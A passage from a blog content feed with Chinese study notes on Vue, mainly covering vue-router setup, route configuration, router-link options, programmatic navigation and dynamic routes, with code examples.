class="attr">age</span>:<span class="number">18</span>,</span><br><span class="line">    <span class="attr">height</span>:<span class="number">1.88</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;age , name&#125; = obj;</span><br></pre></td></tr></table></figure><h2 id="4.store文件夹的目录组织">4.store文件夹的目录组织<a title="#4.store文件夹的目录组织" href="#4.store文件夹的目录组织"></a></h2><p>把mutations、actions、getters全部抽出文件 导入到<code>index.js</code></p><p>建modules文件夹，放moduleA.js …文件 导入<code>index.js</code></p><p>state一般不抽</p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>06 vue-router</title>
      <link href="/learningNotes/vue/06%20vue-route"/>
      <url>/learningNotes/vue/06%20vue-route</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="(2021/03/23-29-p100-118)">(2021/03/23-29 p100-118)<a title="#(2021/03/23-29-p100-118)" href="#(2021/03/23-29-p100-118)"></a></h1><h2 id="1.认识路由">1.认识路由<a title="#1.认识路由" href="#1.认识路由"></a></h2><h3 id="1.1-路由">1.1 路由<a title="#1.1-路由" href="#1.1-路由"></a></h3><p>路由：通过互联的网络把信息从源地址传输到目的地的活动</p><p>路由器提供了两种机制：路由和转送</p><p>​     路由是决定数据包从来源到目的地的路径</p><p>​     转送将输入端的数据转移到合适的输出端</p><p>路由表：本质上就是一个映射表，决定了数据包的指向</p><h3 id="1.2-前端渲染-后端渲染(p101)">1.2 前端渲染 后端渲染(p101)<a title="#1.2-前端渲染-后端渲染(p101)" href="#1.2-前端渲染-后端渲染(p101)"></a></h3><p>后端渲染：jsp：Java serve page</p><p>后端路由：后端处理url和页面之间的映射关系</p><p>前后端分离：ajax</p><p>SPA单页面富应用：在前后端分离的基础上加了一层前端路由</p><p>前端路由的核心：改变url，但页面不进行整体刷新</p><h3 id="1.3-url的hash和html5的history">1.3 url的hash和HTML5的history<a title="#1.3-url的hash和html5的history" href="#1.3-url的hash和html5的history"></a></h3><p>如何实现改变url，不刷新页面</p><h4 id="1.3.1-url的hash">1.3.1 URL的hash<a title="#1.3.1-url的hash" href="#1.3.1-url的hash"></a></h4><p>url的hash也就是锚点（#），本质上是改变window.location的herf属性</p><p>可以通过直接赋值location.hash来改变href，但是页面不发生刷新</p><img src="https://s1.328888.xyz/2022/04/09/XapI2.png" alt="image-20210323202246058" style="zoom:67%;" /><h4 id="1.3.2-html5的history">1.3.2 HTML5的history<a title="#1.3.2-html5的history" href="#1.3.2-html5的history"></a></h4><ul><li><p><code>history.pushState(&#123;&#125;,'','home')</code></p><blockquote><p><code>history.back()</code>可以回退  左箭头也能回退</p></blockquote></li><li><p><code>history.replaceState(&#123;&#125;,'','home')</code></p><blockquote><p>不能回退</p></blockquote></li><li><p><code>history.go() </code></p><blockquote><p><code>history.go(-1) == history.back()</code></p><p>正数前进 负数后退</p></blockquote></li><li><p><code>history.forward()</code></p><blockquote><p><code>history.forward() == history.go(1) </code></p></blockquote></li></ul><h2 id="2.vue-router基本使用">2.vue-router基本使用<a title="#2.vue-router基本使用" href="#2.vue-router基本使用"></a></h2><h3 id="2.1-认识vue-router">2.1 认识vue-router<a title="#2.1-认识vue-router" href="#2.1-认识vue-router"></a></h3><p>目前前端流行的三大框架，都有自己的路由实现：</p><ul><li>Angular的ngRouter</li><li>React的ReactRouter</li><li>Vue的vue-router</li></ul><p>vue-router是Vue.js官方的路由插件，和vue.js是深度集成的，适合用于构建单页面应用</p><p>官网：<a href="https://router.vuejs.org/zh/">https://router.vuejs.org/zh/</a></p><p>vue-router是基于路由和组件的</p><ul><li>路由用于设定访问路径，将路径和组件映射起来</li><li>在vue-router的单页面应用中，页面的路径的改变就是组件的切换</li></ul><h3 id="2.2-安装和使用vue-router">2.2 安装和使用vue-router<a title="#2.2-安装和使用vue-router" href="#2.2-安装和使用vue-router"></a></h3><h4 id="2.2.1安装">2.2.1安装<a title="#2.2.1安装" href="#2.2.1安装"></a></h4><p>步骤一：安装</p><p><code>npm install vue-router --save</code></p><p>步骤二：在模块化工程中使用它（因为是一个插件，所以可以通过Vue.use()来安装路由功能）</p><ol><li><strong>导入</strong>路由对象，并且<strong>调用Vue.use(VueRouter)</strong></li><li>创建<strong>路由实例</strong>，并且传入路由<strong>映射配置</strong></li><li>在<strong>Vue实例</strong>中<strong>挂载</strong>创建的<strong>路由实例</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//router/index.js 搭建路由的框架</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//配置路由相关的信息</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Router</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.通过Vue.use(插件),安装插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Router</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.创建VueRouter对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [&#123;</span><br><span class="line"></span><br><span class="line">&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">    <span class="comment">//配置路由和组件之间的应用关系</span></span><br><span class="line">    routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.将其传入vue实例中</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"><span class="comment">//router文件夹 会自动导入index</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* eslint-disable no-new */</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    router,</span><br><span class="line">    <span class="comment">//将路由传入vue实例</span></span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="2.2.2使用(p104-110)">2.2.2使用(p104-110)<a title="#2.2.2使用(p104-110)" href="#2.2.2使用(p104-110)"></a></h4><h5 id="1.使用步骤">1.使用步骤<a title="#1.使用步骤" href="#1.使用步骤"></a></h5><p>使用vue-router的步骤：</p><ol><li><p>创建路由组件</p></li><li><p>配置路由映射，组件和路径映射的关系</p></li><li><p>使用路由：通过<code>&lt;router-link&gt;</code>和<code>&lt;router-view&gt;</code></p><blockquote><p><code>&lt;router-link&gt;</code>该标签是一个vue-router中已经内置的组件，会被渲染成一个<code>&lt;a&gt;</code>标签</p></blockquote><blockquote><p><code>&lt;router-view&gt;</code>该标签会根据当前路径，动态渲染出不同的组件</p></blockquote><blockquote><p>网页的其他内容，比如顶部的标题/导航，等会和<code>&lt;router-view&gt;</code>处于同一个等级</p></blockquote><blockquote><p>在路由切换时，切换的是<code>&lt;router-view&gt;</code>挂载的组件，其他内容不会发生改变</p></blockquote></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//创建新的组件</span><br><span class="line">//Home.vue</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;h2&gt;我是首页&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;Home&quot;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">//About.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;h2&gt;我是关于&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;About&quot;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//配置映射  index.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//配置路由相关的信息</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Router</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//导入组件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;../components/Home.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&#x27;../components/About.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.通过Vue.use(插件),安装插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Router</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.创建VueRouter对象</span></span><br><span class="line"><span class="keyword">const</span> routes = [&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Home</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">About</span></span><br><span class="line">&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">    <span class="comment">//配置路由和组件之间的应用关系</span></span><br><span class="line">    routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.将其传入vue实例中</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//要把组件写到App.vue才能渲染出来</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">&lt;!-- router-link 与a标签类似  会将a标签渲染在页面上 --&gt;</span><br><span class="line">&lt;router-link to=&quot;/home&quot;&gt;首页&lt;/router-link&gt;</span><br><span class="line">&lt;router-link to=&quot;/about&quot;&gt;关于&lt;/router-link&gt;</span><br><span class="line">&lt;!-- 决定组件展示在页面的位置 --&gt;</span><br><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;App&quot;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><img src='https://s1.328888.xyz/2022/04/09/Xa0jM.png'><h5 id="2.路由的默认路径：">2.路由的默认路径：<a title="#2.路由的默认路径：" href="#2.路由的默认路径："></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="keyword">const</span> routes = [&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,   <span class="comment">//  ‘/’ 加不加都可以</span></span><br><span class="line">    <span class="attr">redirect</span>: <span class="string">&#x27;/home&#x27;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Home</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">About</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><blockquote><p>在routes中又配置了一个映射，</p><p>path配置的是根路径:/</p><p>redirect是重定向，也就是将根路径重定向到/home的路径下，这样就可以打开就默认是home了</p></blockquote><h5 id="3.修改url的展示模式">3.修改url的展示模式<a title="#3.修改url的展示模式" href="#3.修改url的展示模式"></a></h5><blockquote><p>因为默认是hash展示 会有# 没那么好看</p><p>把mode改成history 就可以没有#</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">    <span class="comment">//配置路由和组件之间的应用关系</span></span><br><span class="line">    routes,</span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;history&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="4.router-link补充">4.router-link补充<a title="#4.router-link补充" href="#4.router-link补充"></a></h5><p>属性：</p><ol><li><p><strong>to</strong>：用于指定跳转的路径</p></li><li><p><strong>tag</strong>：指定渲染成什么组件</p><blockquote><p>例<code>&lt;router-link tag='li'&gt;&lt;/router-link&gt;</code>渲染成<code>&lt;li&gt;&lt;/li&gt;</code></p></blockquote></li><li><p><strong>replace</strong>：不会留下history记录</p><blockquote><p>例<code>&lt;router-link replace&gt;&lt;/router-link&gt;</code></p></blockquote></li><li><p><strong>active-class</strong>：当<code>&lt;router-link&gt;</code>对应的路由匹配成功时，会自动给当前元素设置一个<code> router-link-active</code>的<code>class</code>，设置<code>active-class</code>可以修改默认的名称</p><blockquote><p>例<code>&lt;router-link active-class='active'&gt;&lt;/router-link&gt;</code></p></blockquote><blockquote><p>如果很多要改的话 可以在</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">    <span class="comment">//配置路由和组件之间的应用关系</span></span><br><span class="line">    routes,</span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;history&#x27;</span>, <span class="comment">//改变url的展示方式</span></span><br><span class="line">    <span class="attr">linkActiveClass</span>: <span class="string">&#x27;active&#x27;</span>  <span class="comment">//修改默认的点击赋给的类名</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li></ol><h5 id="5.不使用router-link，使用代码修改路径">5.不使用router-link，使用代码修改路径<a title="#5.不使用router-link，使用代码修改路径" href="#5.不使用router-link，使用代码修改路径"></a></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//App.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">&lt;h2&gt;我是app组件&lt;/h2&gt;</span><br><span class="line">&lt;!-- router-link 与a标签类似  相当于将a标签渲染在页面上 --&gt;</span><br><span class="line">&lt;!-- &lt;router-link to=&quot;/home&quot;&gt;首页&lt;/router-link&gt;</span><br><span class="line">&lt;router-link to=&quot;/about&quot;&gt;关于&lt;/router-link&gt; --&gt;</span><br><span class="line">        &lt;!-- 1.用标签直接写  加上触发指定方法 --&gt;</span><br><span class="line">&lt;button @click=&quot;homeClick&quot;&gt;首页&lt;/button&gt;</span><br><span class="line">&lt;button @click=&quot;aboutClick&quot;&gt;关于&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 决定组件展示在页面的位置 --&gt;</span><br><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;App&quot;,</span><br><span class="line">    //2.定义方法</span><br><span class="line">methods: &#123;</span><br><span class="line">homeClick() &#123;</span><br><span class="line">//3.通过代码的方式修改路由  vue-router</span><br><span class="line">//push == pushState  可以返回</span><br><span class="line">// this.$router.push(&quot;/home&quot;);</span><br><span class="line">this.$router.replace(&quot;/home&quot;);</span><br><span class="line">&#125;, </span><br><span class="line">aboutClick() &#123;</span><br><span class="line">this.$router.push(&quot;/about&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="6.动态路由的使用(p108)">6.动态路由的使用(p108)<a title="#6.动态路由的使用(p108)" href="#6.动态路由的使用(p108)"></a></h5><ul><li><p>某些情况下，一个页面的path路径可能是不确定的，比如进入用户页面的时候，希望是</p><ul><li>/user/aaaa  或者 /user/bbbb</li><li>除了有前面的/user 外 ，后面还跟上了用户ID</li><li>这种path和Component的匹配关系，称之为动态路由==》也是路由传递数据的一种方式</li></ul></li><li><p>步骤：</p><ol><li><p><strong>添加组件User.vue 添加路由映射</strong></p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不使用到动态路由的话</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/user&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">User</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用动态路由</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/user/:id&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">User</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li><li><p><strong>在User.vue组件中使用动态路由传递的数据</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    //id 与上面 :后面的名称一样</span><br><span class="line">    &lt;h2&gt;&#123;&#123; $router.params.id &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    </span><br><span class="line">    //或者使用组件下面获取的数据</span><br><span class="line">    &lt;h2&gt;&#123;&#123; userId &#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;User&quot;,</span><br><span class="line">computed: &#123;</span><br><span class="line">userId() &#123;</span><br><span class="line">return this.$route.params.userId;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><p><strong>在展示的组件 App.vue添加 此信息</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        //直接添加  没有动态获取的id</span><br><span class="line">        &lt;router-link to=&quot;/user/zhangsan&quot;&gt;用户&lt;/router-link&gt;</span><br><span class="line">        </span><br><span class="line">        //需要获取下面动态数据 v-bind</span><br><span class="line">&lt;router-link :to=&quot;&#x27;/user/&#x27; + userId&quot;&gt;用户&lt;/router-link&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;App&quot;,</span><br><span class="line">data() &#123;</span><br><span class="line">return &#123;</span><br><span class="line">userId: &quot;lisi&quot;,</span><br><span class="line">&#125;;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote></li></ol></li></ul><p><strong>$router : new出来的路由对象</strong></p><p><strong>$route : 处于活跃的路由</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//User.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;h2&gt;我是用户界面&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;我是用户相关信息&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;User&quot;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="comment">//1.导入 +</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">User</span> <span class="keyword">from</span> <span class="string">&#x27;../components/User.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.创建VueRouter对象 +</span></span><br><span class="line"><span class="keyword">const</span> routes = [&#123;</span><br><span class="line">    <span class="comment">//放在第一个 是好习惯 而非固定要求</span></span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>: <span class="string">&#x27;/home&#x27;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Home</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">About</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/user&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">User</span></span><br><span class="line">&#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>但是不能起到拼接userid的作用</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 